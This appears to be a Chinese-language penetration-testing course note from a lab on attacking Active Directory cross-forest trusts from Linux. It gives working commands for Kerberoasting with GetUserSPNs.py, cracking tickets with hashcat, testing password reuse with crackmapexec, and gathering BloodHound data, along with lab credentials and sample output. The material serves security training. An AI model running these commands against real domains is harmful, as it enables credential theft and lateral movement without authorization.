# 第 78D 章 - 跨樹系攻擊（Linux）與 BloodHound 跨域分析

## 標籤

- #cpts
- #chapter
- #active-directory
- #forest-trust
- #kerberoasting
- #bloodhound
- #linux

## 學習目標

- 從 Linux 攻擊主機用 GetUserSPNs.py 對外部樹系執行 Kerberoasting。
- 設定 /etc/resolv.conf 切換 DNS 以存取不同樹系的 DC。
- 用 bloodhound-python 對多個樹系蒐集 BloodHound 資料。
- 在 BloodHound GUI 查詢 Users with Foreign Domain Group Membership。

---

## 理論基礎

```text
從 Linux 攻擊跨樹系信任：
  → 與 Windows 端相同概念，工具換成 Impacket 套件
  → GetUserSPNs.py 支援 -target-domain → 向外部樹系 KDC 請求 TGS
  → bloodhound-python 可蒐集多個樹系資料 → 上傳同一個 GUI 做交叉分析

DNS 限制：
  → bloodhound-python 需要 DC 的 DNS 主機名稱（非純 IP）
  → 預設 DNS 可能只能解析目前樹系
  → 需手動修改 /etc/resolv.conf 切換到目標樹系的 DC 作為 nameserver
```

---

## 一、跨樹系 Kerberoasting（Linux）

### 理論

```text
GetUserSPNs.py 跨樹系用法：
  → 一般用法：查詢目前 domain 的 SPN 帳號
  → 加 -target-domain EXTERNAL.LOCAL → 改向外部樹系請求 SPN 帳號清單
  → 需提供當前 domain 的有效帳號（用於 Kerberos 跨域交換）

流程：
  1. 無 -request → 只列舉外部樹系 SPN 帳號清單
  2. 加 -request → 同時請求 TGS 票券（可離線破解）
  3. 加 -outputfile → 直接將 TGS 寫入檔案（送 hashcat）
```

```bash
# 步驟一：列舉外部樹系 SPN 帳號（無 -request，只看有哪些目標）
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# -target-domain FREIGHTLOGISTICS.LOCAL → 查詢目標樹系（非當前 domain）
# INLANEFREIGHT.LOCAL/wley              → 當前樹系的有效帳號（用於驗證）
# 輸入密碼後顯示：
# ServicePrincipalName                 Name      MemberOf
# MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,...,DC=FREIGHTLOGISTICS,...
# → mssqlsvc 在外部樹系有 SPN 且是 Domain Admins → 高價值目標

# 步驟二：請求 TGS 票券（加 -request）
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# -request → 向外部樹系 KDC 請求 mssqlsvc 的 TGS
# 輸出包含：
# $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>

# 步驟三：輸出到檔案並離線破解
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley \
  -outputfile mssqlsvc.hash
# -outputfile mssqlsvc.hash → 直接寫入檔案（不需手動複製雜湊）

hashcat -m 13100 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
# -m 13100 → Kerberos 5 TGS-REP etype 23（RC4）
# 破解後輸出：mssqlsvc.hash:1logistics（明文密碼 1logistics）
```

```text
破解後追加動作：
  → 以 mssqlsvc:1logistics 嘗試登入 FREIGHTLOGISTICS.LOCAL 的 DC
  → 同時在當前 INLANEFREIGHT.LOCAL 測試密碼重用：
      crackmapexec smb 172.16.5.5 -u mssqlsvc -p 1logistics
  → 若兩個 domain 由同一管理員管理 → 密碼重用機率高
  → 即使已在當前 domain 提權成功 → 密碼重用仍值得寫入報告（發現項目）
```

---

## 二、BloodHound-Python 跨樹系資料蒐集

### 理論

```text
bloodhound-python 特性：
  → 用 Python 實作的 BloodHound 資料蒐集器（fox-it/BloodHound.py）
  → 支援從 Linux 主機蒐集 AD 資料 → 輸出 JSON → 上傳 BloodHound GUI
  → 可對多個 domain/forest 分別執行 → 上傳同一個 GUI → 跨域關係查詢

DNS 設定問題：
  → bloodhound-python 需要 DC FQDN（hostname），不接受純 IP
  → 若 /etc/resolv.conf 設定到其他 DNS → 無法解析目標 DC
  → 解法：修改 /etc/resolv.conf → 設定目標 DC IP 為 nameserver

重要欄位：
  -d → 目標 domain
  -dc → 目標 DC FQDN（必填，需 DNS 可解析）
  -c All → 蒐集全部資料（Users, Groups, Computers, Trusts 等）
  -u → 有效帳號（username@domain 格式用於跨樹系）
  -p → 密碼
```

```bash
# ─── 蒐集 INLANEFREIGHT.LOCAL ───

# 設定 DNS 到 INLANEFREIGHT DC
sudo nano /etc/resolv.conf
# 內容如下：
# #nameserver 1.1.1.1
# #nameserver 8.8.8.8
# domain INLANEFREIGHT.LOCAL
# nameserver 172.16.5.5        ← ACADEMY-EA-DC01 IP

# 執行 bloodhound-python（INLANEFREIGHT.LOCAL）
bloodhound-python -d INLANEFREIGHT.LOCAL \
  -dc ACADEMY-EA-DC01 \
  -c All \
  -u forend \
  -p Klmcargo2
# -d  INLANEFREIGHT.LOCAL  → 目標 domain
# -dc ACADEMY-EA-DC01      → DC 主機名稱（DNS 必須可解析）
# -c  All                  → 蒐集所有類型資料
# -u  forend               → 有效帳號
# -p  Klmcargo2            → 密碼
# 輸出：Found 2 domains in the forest, 559 computers, 2950 users, 183 groups, 2 trusts

# 壓縮輸出 JSON（單一 zip 上傳 BloodHound GUI）
zip -r ilfreight_bh.zip *.json
# → ilfreight_bh.zip（含 computers/domains/groups/users .json）
```

```bash
# ─── 蒐集 FREIGHTLOGISTICS.LOCAL ───

# 切換 DNS 到 FREIGHTLOGISTICS DC
sudo nano /etc/resolv.conf
# 內容如下：
# domain FREIGHTLOGISTICS.LOCAL
# nameserver 172.16.5.238     ← ACADEMY-EA-DC03 IP

# 執行 bloodhound-python（FREIGHTLOGISTICS.LOCAL）
bloodhound-python -d FREIGHTLOGISTICS.LOCAL \
  -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
  -c All \
  -u forend@inlanefreight.local \
  -p Klmcargo2
# -u forend@inlanefreight.local → 跨樹系帳號格式（user@source-domain）
# -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL → 外部樹系 DC FQDN
# 輸出：Found 1 domain, 5 computers, 9 users, 52 groups, 1 trust

# 壓縮外部樹系資料
zip -r freightlogistics_bh.zip *.json
```

---

## 三、BloodHound GUI 跨樹系分析

### 理論

```text
BloodHound GUI 跨域分析流程：
  → 將兩個 zip（ilfreight_bh.zip + freightlogistics_bh.zip）分別上傳到同一個 GUI
  → GUI 自動合併資料 → 可查詢跨樹系關係

重要查詢：
  → Analysis 標籤 → "Users with Foreign Domain Group Membership"
  → 選擇 Source Domain = INLANEFREIGHT.LOCAL
  → 顯示 INLANEFREIGHT.LOCAL 使用者在 FREIGHTLOGISTICS.LOCAL 群組內的關係

預期發現（實驗環境）：
  → INLANEFREIGHT.LOCAL 的 Administrator 帳號
  → 是 FREIGHTLOGISTICS.LOCAL 的 Administrators（內建群組）成員
  → 代表：若密碼相同 → 可直接登入外部 DC
```

```text
上傳流程：
  1. 開啟 BloodHound GUI
  2. 點擊右上角「Upload Data」
  3. 選擇 ilfreight_bh.zip → 上傳
  4. 再次點擊「Upload Data」
  5. 選擇 freightlogistics_bh.zip → 上傳
  6. Analysis → "Users with Foreign Domain Group Membership"
  7. 選擇 Source Domain → 查看結果
```

---

## 判斷邏輯

```
Linux 環境，需攻擊跨樹系信任
│
├── 跨樹系 Kerberoasting
│   ├── GetUserSPNs.py -target-domain EXTERNAL.LOCAL CURRENT.LOCAL/user
│   ├── 找到 SPN 帳號 → 加 -request -outputfile hash.txt
│   ├── hashcat -m 13100 → 離線破解
│   └── 破解後：
│       ├── 登入外部 DC（若是 DA）
│       └── 測試密碼重用（crackmapexec 當前 domain）
│
└── BloodHound 跨樹系分析
    ├── 設定 /etc/resolv.conf → nameserver 指向目標 DC IP
    ├── bloodhound-python -d DOMAIN -dc DC_FQDN -c All -u USER -p PASS
    ├── zip -r output.zip *.json
    ├── 對每個 domain 重複（切換 DNS）
    ├── 上傳所有 zip 到 BloodHound GUI
    └── Analysis → "Users with Foreign Domain Group Membership"
        └── 找到跨域管理員 → 測試密碼重用 → Enter-PSSession 外部 DC
```

---

## 速查表

```bash
# 跨樹系 Kerberoasting（列舉）
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# 跨樹系 Kerberoasting（取得 TGS）
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley \
  -outputfile mssqlsvc.hash

# 破解 TGS
hashcat -m 13100 mssqlsvc.hash /usr/share/wordlists/rockyou.txt

# 設定 DNS（/etc/resolv.conf）
# domain TARGET.LOCAL
# nameserver TARGET_DC_IP

# bloodhound-python（當前樹系）
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

# bloodhound-python（外部樹系，跨域帳號格式）
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
  -c All -u forend@inlanefreight.local -p Klmcargo2

# 壓縮上傳
zip -r domain_bh.zip *.json
```

---

## 關聯筆記

- [[78C-跨樹系攻擊|第 78C 章 - 跨樹系攻擊（Windows）]]
- [[78E-AD強化與稽核|第 78E 章 - AD 強化與稽核]]
- [[78A-信任關係列舉與濫用|第 78A 章 - 信任關係列舉與濫用]]
- [[09-Volume-9-Active-Directory-Index|Vol.9 - Active Directory]]
